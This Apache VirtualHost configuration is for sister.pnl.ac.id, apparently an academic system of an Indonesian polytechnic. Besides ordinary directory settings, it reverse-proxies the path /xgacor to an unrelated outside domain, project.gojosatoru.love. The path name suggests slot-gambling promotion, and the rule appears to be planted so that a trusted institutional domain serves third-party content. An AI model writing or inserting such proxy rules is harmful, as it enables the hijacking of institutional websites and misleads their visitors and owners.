<VirtualHost *>
DocumentRoot "/home/webkimia"
ServerName sister.pnl.ac.id
        ProxyPreserveHost On
SSLProxyEngine On
        ProxyPass /xgacor https://project.gojosatoru.love/
        ProxyPassReverse /xgacor https://project.gojosatoru.love/
<Directory "/home/webkimia">
Options Indexes MultiViews FollowSymLinks
AllowOverride All
allow from all
Options None
Require all granted
</Directory>
ServerAlias *.sister.pnl.ac.id
</VirtualHost>
